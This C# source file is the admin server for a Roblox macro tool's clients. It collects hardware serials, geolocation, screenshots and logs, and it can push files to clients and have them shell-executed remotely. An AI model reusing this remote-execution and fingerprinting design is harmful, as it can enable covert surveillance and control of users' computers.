using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace SoulBeatsAdmin;

/// <summary>
/// One file that lives in a client's pushed-files directory, as reported by
/// the client's pushed_files message. Used by the remote file viewer.
/// </summary>
internal sealed class PushedFileEntry
{
    public string Name { get; set; } = "";
    public long Size { get; set; }
    public DateTime Modified { get; set; }
}

/// <summary>
/// Result of a file operation on the client side (push / open). The client
/// emits one of these after every push_file save attempt and every
/// open_pushed_file — the UI surfaces them as toasts so the operator knows
/// whether a push actually landed, whether it was blocked by extension, etc.
/// </summary>
internal sealed class FileOpResult
{
    public string Op { get; set; } = "";       // "push" or "open"
    public string FileName { get; set; } = ""; // requested name
    public string SavedAs { get; set; } = "";  // final name (may differ on collision)
    public string Dir { get; set; } = "";      // where it landed on the client
    public long Size { get; set; }
    public bool Ok { get; set; }
    public string Message { get; set; } = "";
}

/// <summary>
/// Represents a connected client (robeatspro instance).
/// </summary>
internal sealed class ConnectedClient
{
    public string Id { get; set; } = "";
    public string UserId { get; set; } = "";
    public string PcName { get; set; } = "";
    public string OsUser { get; set; } = "";
    public string Version { get; set; } = "";
    public string ScreenRes { get; set; } = "";
    public string GameMode { get; set; } = "";
    public string Cpu { get; set; } = "";
    public string Ram { get; set; } = "";
    public string Os { get; set; } = "";
    public bool MacroRunning { get; set; }
    public bool MacroActive { get; set; }
    public int Fps { get; set; }
    public string SessionDuration { get; set; } = "";
    public DateTime ConnectedAt { get; set; } = DateTime.UtcNow;
    public DateTime LastHeartbeat { get; set; } = DateTime.UtcNow;
    public Dictionary<string, int> FeatureUsage { get; set; } = new();

    /// <summary>
    /// The real client IP. When connections come through a playit.gg tunnel with
    /// PROXY protocol v1 enabled, this is parsed from the PROXY header. Otherwise
    /// it falls back to the raw socket remote endpoint.
    /// </summary>
    public string RealIp { get; set; } = "";

    // ── Hardware fingerprint ────────────────────────────────
    public string DeviceId { get; set; } = "";
    public string MotherboardSerial { get; set; } = "";
    public string DiskSerial { get; set; } = "";
    public string MacHash { get; set; } = "";

    // ── GPU ─────────────────────────────────────────────────
    public string GpuName { get; set; } = "";
    public string GpuDriverVersion { get; set; } = "";
    public string GpuDriverDate { get; set; } = "";
    public string GpuRam { get; set; } = "";

    // ── Network / ISP ───────────────────────────────────────
    public string PublicIp { get; set; } = "";
    public string Country { get; set; } = "";
    public string Region { get; set; } = "";
    public string City { get; set; } = "";
    public string Isp { get; set; } = "";
    public string Asn { get; set; } = "";

    // ── Runtime ─────────────────────────────────────────────
    public long UptimeSeconds { get; set; }
    public int IdleSeconds { get; set; }
    public bool RobloxRunning { get; set; }
    public string RobloxPlaceId { get; set; } = "";
    public string RobloxTitle { get; set; } = "";
    public int RobloxPingMs { get; set; } = -1;

    // ── Launch count / install ─────────────────────────────
    public int TotalLaunches { get; set; }
    public string InstallDate { get; set; } = "";

    // ── Latest config snapshot (filled after request_config command) ─
    public string LatestConfigSnapshot { get; set; } = "";
    public DateTime? LatestConfigSnapshotAt { get; set; }

    // ── Pushed files (filled after a list_pushed_files command) ──
    public List<PushedFileEntry> PushedFiles { get; set; } = new();
    public string PushedFilesDir { get; set; } = "";
    public DateTime? PushedFilesFetchedAt { get; set; }

    internal TcpClient Tcp { get; set; } = null!;
    internal NetworkStream Stream { get; set; } = null!;
    internal readonly object WriteLock = new();

    // ── Rate limiting state (set by server) ────────────────
    internal DateTime RateWindowStart = DateTime.UtcNow;
    internal int MessagesInWindow;

    public bool Authenticated { get; set; }
    public string StatusText => MacroRunning ? (MacroActive ? "ACTIVE" : "PAUSED") : "IDLE";
    public bool IsStale => (DateTime.UtcNow - LastHeartbeat).TotalSeconds > 15;
}

/// <summary>
/// TCP server that manages client connections for the admin panel.
/// Clients send registration + heartbeats; server sends commands + files.
/// Protocol: newline-delimited JSON messages.
/// </summary>
internal sealed class AdminServer : IDisposable
{
    // ── Security limits ───────────────────────────────────────
    // Tune these if you outgrow them. They're intentionally generous for
    // legitimate clients (a heartbeat every 2s is ~0.5 msg/s) and only bite
    // on abuse.
    //
    // MaxMessageBytes: a 1080p JPEG screenshot base64-encodes to 400–800 KB
    // and high-DPI screens can exceed 1 MB; 4 MB gives comfortable headroom
    // while still rejecting multi-GB garbage payloads.
    //
    // MaxMessagesPerSecond: legit traffic is heartbeat (0.5/s) plus occasional
    // commands and the log-tail stream which can burst. 100/s absorbs log
    // bursts without kicking legitimate clients.
    private const int MaxMessageBytes = 4 * 1024 * 1024;  // 4 MB
    private const int MaxMessagesPerSecond = 100;         // per authenticated client
    private const int MaxConnectionsPerIpPerMinute = 20;  // slow-brute-force guard
    private const int MaxConcurrentClients = 100;         // global cap
    private const int AuthTimeoutSeconds = 5;             // disconnect if register doesn't arrive in time

    private TcpListener? _listener;
    private readonly List<ConnectedClient> _clients = [];
    private readonly object _lock = new();
    private volatile bool _running;
    private CancellationTokenSource? _cts;
    private string _authToken = "";

    // Per-IP sliding window for connection rate limiting
    private readonly Dictionary<string, List<DateTime>> _ipConnects = new();
    private readonly object _ipLock = new();

    public int Port { get; private set; }
    public bool IsRunning => _running;

    public event Action<ConnectedClient>? ClientConnected;
    public event Action<ConnectedClient>? ClientDisconnected;
    public event Action<ConnectedClient>? ClientUpdated;
    public event Action<ConnectedClient, string>? ScreenshotReceived;
    public event Action<string>? ClientRejected; // reason string
    public event Action<ConnectedClient, string>? ConfigSnapshotReceived;
    public event Action<ConnectedClient, string>? LogLineReceived;
    public event Action<ConnectedClient, int>? RobloxPingReceived;

    /// <summary>Fires when a client responds to list_pushed_files.</summary>
    public event Action<ConnectedClient>? PushedFilesReceived;

    /// <summary>
    /// Fires for every file_op_result from a client — e.g. after a push_file
    /// save attempt, or after an open_pushed_file. The UI uses this to show
    /// status toasts ("saved as foo_1.png", "extension blocked", etc.).
    /// </summary>
    public event Action<ConnectedClient, FileOpResult>? FileOpResultReceived;

    public IReadOnlyList<ConnectedClient> Clients
    {
        get { lock (_lock) return _clients.ToList(); }
    }

    public int ClientCount
    {
        get { lock (_lock) return _clients.Count; }
    }

    // ── Server lifecycle ──────────────────────────────────────

    public void Start(int port, string authToken = "")
    {
        if (_running) return;
        Port = port;
        _authToken = authToken;
        _cts = new CancellationTokenSource();
        _listener = new TcpListener(IPAddress.Any, port);
        _listener.Start();
        _running = true;
        _ = Task.Run(() => AcceptLoop(_cts.Token));
    }

    public void Stop()
    {
        _running = false;
        _cts?.Cancel();
        try { _listener?.Stop(); } catch { }

        lock (_lock)
        {
            foreach (var c in _clients)
            {
                try { c.Tcp.Close(); } catch { }
            }
            _clients.Clear();
        }
    }

    // ── Accept loop ───────────────────────────────────────────

    private async Task AcceptLoop(CancellationToken ct)
    {
        while (_running && !ct.IsCancellationRequested)
        {
            try
            {
                var tcp = await _listener!.AcceptTcpClientAsync(ct);
                tcp.NoDelay = true;

                // Global concurrent-client cap — reject before the handler task even starts.
                int currentCount;
                lock (_lock) currentCount = _clients.Count;
                if (currentCount >= MaxConcurrentClients)
                {
                    var ep = tcp.Client.RemoteEndPoint?.ToString() ?? "unknown";
                    ClientRejected?.Invoke($"Rejected {ep} — server at capacity ({MaxConcurrentClients})");
                    try { tcp.Close(); } catch { }
                    continue;
                }

                _ = Task.Run(() => HandleClient(tcp, ct), ct);
            }
            catch (OperationCanceledException) { break; }
            catch { if (_running) await Task.Delay(200, CancellationToken.None); }
        }
    }

    /// <summary>
    /// Per-IP sliding window. Enforces MaxConnectionsPerIpPerMinute so a
    /// single source can't exhaust accept-loop resources by looping connect().
    /// Returns true if the connection is allowed.
    /// </summary>
    private bool CheckIpRateLimit(string ip)
    {
        if (string.IsNullOrEmpty(ip)) return true;
        var now = DateTime.UtcNow;
        var cutoff = now.AddMinutes(-1);

        lock (_ipLock)
        {
            if (!_ipConnects.TryGetValue(ip, out var list))
            {
                list = new List<DateTime>();
                _ipConnects[ip] = list;
            }
            list.RemoveAll(t => t < cutoff);

            // Opportunistic cleanup so the dict doesn't grow forever.
            if (_ipConnects.Count > 1000)
            {
                var stale = _ipConnects.Where(kv => kv.Value.Count == 0).Select(kv => kv.Key).ToList();
                foreach (var k in stale) _ipConnects.Remove(k);
            }

            if (list.Count >= MaxConnectionsPerIpPerMinute) return false;
            list.Add(now);
            return true;
        }
    }

    private async Task HandleClient(TcpClient tcp, CancellationToken ct)
    {
        var client = new ConnectedClient
        {
            Id = Guid.NewGuid().ToString("N")[..8],
            Tcp = tcp,
            Stream = tcp.GetStream()
        };

        // Fallback: raw socket remote endpoint. For tunneled connections this is the
        // tunnel edge (e.g. playit.gg) rather than the real user — the PROXY header
        // parsed below will overwrite it when present.
        try
        {
            if (tcp.Client.RemoteEndPoint is IPEndPoint ep)
                client.RealIp = ep.Address.ToString();
        }
        catch { }

        lock (_lock) _clients.Add(client);

        // Kick off the auth timeout watchdog. If the client hasn't sent a valid
        // register within AuthTimeoutSeconds, force-close the socket. This breaks
        // the read loop and the finally block cleans up.
        var authWatchdogCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
        _ = Task.Run(async () =>
        {
            try
            {
                await Task.Delay(TimeSpan.FromSeconds(AuthTimeoutSeconds), authWatchdogCts.Token);
                if (!client.Authenticated)
                {
                    ClientRejected?.Invoke($"Rejected {client.RealIp} — auth timeout (no register in {AuthTimeoutSeconds}s)");
                    try { tcp.Close(); } catch { }
                }
            }
            catch { }
        }, authWatchdogCts.Token);

        try
        {
            bool firstLine = true;

            while (_running && !ct.IsCancellationRequested && tcp.Connected)
            {
                string? line;
                try
                {
                    line = await ReadBoundedLineAsync(client.Stream, MaxMessageBytes, ct);
                }
                catch (InvalidDataException ex)
                {
                    // Oversized line — drop the client. This is almost always a bug or abuse.
                    ClientRejected?.Invoke($"Closed {client.RealIp} — {ex.Message}");
                    break;
                }
                catch { break; }

                if (line == null) break;
                if (line.Length == 0) continue;

                // PROXY protocol v1 is sent as the very first line by playit.gg when
                // PROXY support is enabled on the tunnel. Format:
                //   PROXY TCP4 <src_ip> <dst_ip> <src_port> <dst_port>\r\n
                //   PROXY TCP6 <src_ip> <dst_ip> <src_port> <dst_port>\r\n
                //   PROXY UNKNOWN\r\n
                if (firstLine)
                {
                    firstLine = false;
                    if (line.StartsWith("PROXY ", StringComparison.Ordinal))
                    {
                        var parts = line.Split(' ');
                        if (parts.Length >= 3 && parts[1] != "UNKNOWN")
                            client.RealIp = parts[2];

                        // Now that we know the real IP, enforce per-IP rate limiting.
                        // (Doing this AFTER PROXY parse means we rate-limit on the
                        // real client, not on the tunnel edge — otherwise every
                        // legitimate connection would look like it came from one IP.)
                        if (!CheckIpRateLimit(client.RealIp))
                        {
                            ClientRejected?.Invoke($"Rejected {client.RealIp} — connection rate limit");
                            break;
                        }
                        continue;
                    }

                    // No PROXY header — rate limit against the socket endpoint now.
                    if (!CheckIpRateLimit(client.RealIp))
                    {
                        ClientRejected?.Invoke($"Rejected {client.RealIp} — connection rate limit");
                        break;
                    }
                }

                // Per-client message rate limit. Only applies after register —
                // the register itself is allowed through so we can authenticate.
                if (client.Authenticated && !CheckMessageRate(client))
                {
                    ClientRejected?.Invoke($"Closed {client.RealIp} — message rate limit");
                    break;
                }

                ProcessMessage(client, line);
            }
        }
        catch { }
        finally
        {
            try { authWatchdogCts.Cancel(); authWatchdogCts.Dispose(); } catch { }
            lock (_lock) _clients.Remove(client);
            try { tcp.Close(); } catch { }
            ClientDisconnected?.Invoke(client);
        }
    }

    /// <summary>
    /// Byte-level line reader with a hard upper bound. StreamReader has no
    /// built-in length limit so a malicious client could send a single
    /// unbounded "line" and OOM the server. Reads until \n or EOF, discards
    /// \r, throws InvalidDataException past <paramref name="maxBytes"/>.
    /// </summary>
    private static async Task<string?> ReadBoundedLineAsync(NetworkStream stream, int maxBytes, CancellationToken ct)
    {
        var buf = new byte[Math.Min(4096, maxBytes)];
        var ms = new MemoryStream();
        var one = new byte[1];
        while (true)
        {
            int n = await stream.ReadAsync(one.AsMemory(0, 1), ct);
            if (n == 0)
            {
                if (ms.Length == 0) return null;
                return Encoding.UTF8.GetString(ms.GetBuffer(), 0, (int)ms.Length);
            }
            var b = one[0];
            if (b == (byte)'\n')
                return Encoding.UTF8.GetString(ms.GetBuffer(), 0, (int)ms.Length);
            if (b == (byte)'\r') continue;
            if (ms.Length >= maxBytes)
                throw new InvalidDataException($"message too large (> {maxBytes} bytes)");
            ms.WriteByte(b);
        }
    }

    /// <summary>
    /// Sliding 1-second window for per-client message rate. Resets every
    /// second; over-limit returns false and the caller should close the
    /// connection.
    /// </summary>
    private static bool CheckMessageRate(ConnectedClient client)
    {
        var now = DateTime.UtcNow;
        if ((now - client.RateWindowStart).TotalSeconds >= 1.0)
        {
            client.RateWindowStart = now;
            client.MessagesInWindow = 0;
        }
        client.MessagesInWindow++;
        return client.MessagesInWindow <= MaxMessagesPerSecond;
    }

    // ── Message processing ────────────────────────────────────

    private void ProcessMessage(ConnectedClient client, string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            var type = root.GetProperty("type").GetString() ?? "";
            var data = root.GetProperty("data");

            switch (type)
            {
                case "register":
                    // Validate auth token before accepting
                    var token = GetStr(data, "authToken");
                    if (!string.IsNullOrEmpty(_authToken) && token != _authToken)
                    {
                        var ip = !string.IsNullOrEmpty(client.RealIp)
                            ? client.RealIp
                            : client.Tcp.Client.RemoteEndPoint?.ToString() ?? "unknown";
                        ClientRejected?.Invoke($"Rejected connection from {ip} — invalid auth token");
                        try { client.Tcp.Close(); } catch { }
                        return;
                    }

                    client.Authenticated = true;
                    client.UserId = GetStr(data, "userId");
                    client.PcName = GetStr(data, "pcName");
                    client.OsUser = GetStr(data, "osUser");
                    client.Version = GetStr(data, "version");
                    client.ScreenRes = GetStr(data, "screen");
                    client.GameMode = GetStr(data, "gameMode");
                    client.Cpu = GetStr(data, "cpu");
                    client.Ram = GetStr(data, "ram");
                    client.Os = GetStr(data, "os");

                    // New in v1.0.7: hardware fingerprint
                    client.DeviceId = GetStr(data, "deviceId");
                    client.MotherboardSerial = GetStr(data, "motherboardSerial");
                    client.DiskSerial = GetStr(data, "diskSerial");
                    client.MacHash = GetStr(data, "macHash");

                    // GPU
                    client.GpuName = GetStr(data, "gpuName");
                    client.GpuDriverVersion = GetStr(data, "gpuDriverVersion");
                    client.GpuDriverDate = GetStr(data, "gpuDriverDate");
                    client.GpuRam = GetStr(data, "gpuRam");

                    // Network / ISP
                    client.PublicIp = GetStr(data, "publicIp");
                    client.Country = GetStr(data, "country");
                    client.Region = GetStr(data, "region");
                    client.City = GetStr(data, "city");
                    client.Isp = GetStr(data, "isp");
                    client.Asn = GetStr(data, "asn");

                    // Launch stats
                    client.TotalLaunches = data.TryGetProperty("totalLaunches", out var tl) && tl.ValueKind == JsonValueKind.Number
                        ? tl.GetInt32() : 0;
                    client.InstallDate = GetStr(data, "installDate");

                    client.LastHeartbeat = DateTime.UtcNow;
                    ClientConnected?.Invoke(client);
                    break;

                case "heartbeat":
                    // Ignore messages from unauthenticated clients
                    if (!client.Authenticated) return;

                    client.MacroRunning = data.TryGetProperty("running", out var r) && r.GetBoolean();
                    client.MacroActive = data.TryGetProperty("active", out var a) && a.GetBoolean();
                    client.Fps = data.TryGetProperty("fps", out var f) ? f.GetInt32() : 0;
                    client.SessionDuration = GetStr(data, "sessionDuration");
                    client.GameMode = GetStr(data, "gameMode");
                    client.LastHeartbeat = DateTime.UtcNow;

                    // Uptime / idle
                    client.UptimeSeconds = data.TryGetProperty("uptimeSeconds", out var up) && up.ValueKind == JsonValueKind.Number
                        ? up.GetInt64() : 0;
                    client.IdleSeconds = data.TryGetProperty("idleSeconds", out var idl) && idl.ValueKind == JsonValueKind.Number
                        ? idl.GetInt32() : 0;

                    // Roblox process watch
                    client.RobloxRunning = data.TryGetProperty("robloxRunning", out var rr) && rr.GetBoolean();
                    client.RobloxPlaceId = GetStr(data, "robloxPlaceId");
                    client.RobloxTitle = GetStr(data, "robloxTitle");

                    // Network / ISP — the client's ip-api lookup is async and
                    // may have been empty during register, so we accept updated
                    // values here. Only overwrite when the heartbeat actually
                    // carries a non-empty value (avoid wiping good data if the
                    // lookup later fails transiently).
                    var hbPublicIp = GetStr(data, "publicIp");
                    if (!string.IsNullOrEmpty(hbPublicIp)) client.PublicIp = hbPublicIp;
                    var hbCountry = GetStr(data, "country");
                    if (!string.IsNullOrEmpty(hbCountry)) client.Country = hbCountry;
                    var hbRegion = GetStr(data, "region");
                    if (!string.IsNullOrEmpty(hbRegion)) client.Region = hbRegion;
                    var hbCity = GetStr(data, "city");
                    if (!string.IsNullOrEmpty(hbCity)) client.City = hbCity;
                    var hbIsp = GetStr(data, "isp");
                    if (!string.IsNullOrEmpty(hbIsp)) client.Isp = hbIsp;
                    var hbAsn = GetStr(data, "asn");
                    if (!string.IsNullOrEmpty(hbAsn)) client.Asn = hbAsn;

                    if (data.TryGetProperty("featureUsage", out var fu))
                    {
                        client.FeatureUsage.Clear();
                        foreach (var prop in fu.EnumerateObject())
                        {
                            if (prop.Value.ValueKind == JsonValueKind.Number)
                                client.FeatureUsage[prop.Name] = prop.Value.GetInt32();
                        }
                    }

                    ClientUpdated?.Invoke(client);
                    break;

                case "screenshot_data":
                    if (!client.Authenticated) return;

                    var img = GetStr(data, "image");
                    if (!string.IsNullOrEmpty(img))
                        ScreenshotReceived?.Invoke(client, img);
                    break;

                case "config_snapshot":
                    if (!client.Authenticated) return;

                    var snapshot = GetStr(data, "settings");
                    if (!string.IsNullOrEmpty(snapshot))
                    {
                        client.LatestConfigSnapshot = snapshot;
                        client.LatestConfigSnapshotAt = DateTime.UtcNow;
                        ConfigSnapshotReceived?.Invoke(client, snapshot);
                    }
                    break;

                case "log_line":
                    if (!client.Authenticated) return;
                    var logLine = GetStr(data, "line");
                    if (!string.IsNullOrEmpty(logLine))
                        LogLineReceived?.Invoke(client, logLine);
                    break;

                case "roblox_ping":
                    if (!client.Authenticated) return;
                    if (data.TryGetProperty("ms", out var pingMs) && pingMs.ValueKind == JsonValueKind.Number)
                    {
                        client.RobloxPingMs = pingMs.GetInt32();
                        RobloxPingReceived?.Invoke(client, client.RobloxPingMs);
                        ClientUpdated?.Invoke(client);
                    }
                    break;

                case "pushed_files":
                    if (!client.Authenticated) return;
                    client.PushedFiles.Clear();
                    client.PushedFilesDir = GetStr(data, "dir");
                    client.PushedFilesFetchedAt = DateTime.UtcNow;
                    if (data.TryGetProperty("files", out var fileArr) && fileArr.ValueKind == JsonValueKind.Array)
                    {
                        foreach (var fe in fileArr.EnumerateArray())
                        {
                            var entry = new PushedFileEntry
                            {
                                Name = GetStr(fe, "name"),
                                Size = fe.TryGetProperty("size", out var sz) && sz.ValueKind == JsonValueKind.Number ? sz.GetInt64() : 0
                            };
                            if (fe.TryGetProperty("modified", out var md) && md.ValueKind == JsonValueKind.String &&
                                DateTime.TryParse(md.GetString(), out var dt))
                            {
                                entry.Modified = dt;
                            }
                            if (!string.IsNullOrEmpty(entry.Name))
                                client.PushedFiles.Add(entry);
                        }
                    }
                    PushedFilesReceived?.Invoke(client);
                    break;

                case "file_op_result":
                    if (!client.Authenticated) return;
                    var result = new FileOpResult
                    {
                        Op = GetStr(data, "op"),
                        FileName = GetStr(data, "fileName"),
                        SavedAs = GetStr(data, "savedAs"),
                        Dir = GetStr(data, "dir"),
                        Size = data.TryGetProperty("size", out var fsz) && fsz.ValueKind == JsonValueKind.Number ? fsz.GetInt64() : 0,
                        Ok = data.TryGetProperty("ok", out var fok) && fok.GetBoolean(),
                        Message = GetStr(data, "message")
                    };
                    FileOpResultReceived?.Invoke(client, result);
                    break;
            }
        }
        catch { }
    }

    // ── Send commands to clients ──────────────────────────────

    public void SendCommand(ConnectedClient client, string action)
        => SendMessage(client, "command", new { action });

    public void RequestScreenshot(ConnectedClient client)
        => SendMessage(client, "command", new { action = "request_screenshot" });

    public void RequestConfig(ConnectedClient client)
        => SendMessage(client, "command", new { action = "request_config" });

    public void StartLogTail(ConnectedClient client)
        => SendMessage(client, "command", new { action = "log_tail_start" });

    public void StopLogTail(ConnectedClient client)
        => SendMessage(client, "command", new { action = "log_tail_stop" });

    public void RequestRobloxPing(ConnectedClient client)
        => SendMessage(client, "command", new { action = "request_ping" });

    /// <summary>
    /// Asks a client to list every file in its pushed-files directory. The
    /// response comes back asynchronously as a pushed_files message and
    /// fires PushedFilesReceived.
    /// </summary>
    public void RequestPushedFiles(ConnectedClient client)
        => SendMessage(client, "command", new { action = "list_pushed_files" });

    /// <summary>
    /// Asks a client to open a previously-pushed file with its default Windows
    /// handler. The client validates the filename server-side (can't escape the
    /// recv dir), then shell-executes it. Result comes back as file_op_result.
    /// </summary>
    public void OpenPushedFile(ConnectedClient client, string fileName)
        => SendMessage(client, "command", new { action = "open_pushed_file", fileName });

    /// <summary>
    /// Pushes a feature-gate update to a single client. The client persists
    /// it and honors it at runtime; a revoke also stops the macro engine.
    /// </summary>
    public void SendFeatureGate(ConnectedClient client, string[] disabledFeatures, bool revoked, string reason)
        => SendMessage(client, "feature_gate", new { disabledFeatures, revoked, reason });

    public void RevokeClient(ConnectedClient client, string reason)
        => SendFeatureGate(client, Array.Empty<string>(), true, reason);

    public void SendFile(ConnectedClient client, string fileName, byte[] fileData, string message = "")
        => SendMessage(client, "push_file", new
        {
            fileName,
            fileData = Convert.ToBase64String(fileData),
            message
        });

    public void SendAnnouncement(ConnectedClient client, string message)
        => SendMessage(client, "announcement", new { message });

    public void BroadcastCommand(string action)
    {
        foreach (var c in Clients) SendCommand(c, action);
    }

    public void BroadcastFile(string fileName, byte[] fileData, string message = "")
    {
        foreach (var c in Clients) SendFile(c, fileName, fileData, message);
    }

    public void BroadcastAnnouncement(string message)
    {
        foreach (var c in Clients) SendAnnouncement(c, message);
    }

    public void KickClient(ConnectedClient client)
    {
        try { client.Tcp.Close(); } catch { }
    }

    // ── Transport ─────────────────────────────────────────────

    private static void SendMessage(ConnectedClient client, string type, object data)
    {
        try
        {
            var msg = JsonSerializer.Serialize(new { type, data });
            var bytes = Encoding.UTF8.GetBytes(msg + "\n");
            lock (client.WriteLock)
            {
                client.Stream.Write(bytes);
                client.Stream.Flush();
            }
        }
        catch { }
    }

    // ── Helpers ───────────────────────────────────────────────

    private static string GetStr(JsonElement el, string prop)
        => el.TryGetProperty(prop, out var v) ? v.GetString() ?? "" : "";

    public static string GetLocalIp()
    {
        try
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ip))
                    return ip.ToString();
            }
        }
        catch { }
        return "127.0.0.1";
    }

    public void Dispose()
    {
        Stop();
        _cts?.Dispose();
    }
}
